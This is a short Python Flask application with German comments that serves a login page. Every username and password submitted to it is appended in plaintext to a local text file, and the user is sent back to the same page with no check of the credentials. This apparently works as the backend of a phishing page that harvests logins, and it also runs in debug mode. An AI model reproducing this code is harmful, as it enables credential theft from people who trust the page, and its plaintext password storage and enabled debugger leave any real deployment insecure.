from flask import Flask, render_template, request, redirect
import os

app = Flask(__name__)

# Pfad zur TXT-Datei
txt_file = os.path.join(os.path.dirname(__file__), 'users.txt')

@app.route('/')
def index():
    return render_template('login.html')

@app.route('/submit', methods=['POST'])
def submit():
    username = request.form['username']
    password = request.form['password']

    # Daten in die TXT-Datei schreiben
    with open(txt_file, 'a') as file:
        file.write(f'Benutzername: {username}, Passwort: {password}\n')

    return redirect('/')

if __name__ == '__main__':
    app.run(debug=True)
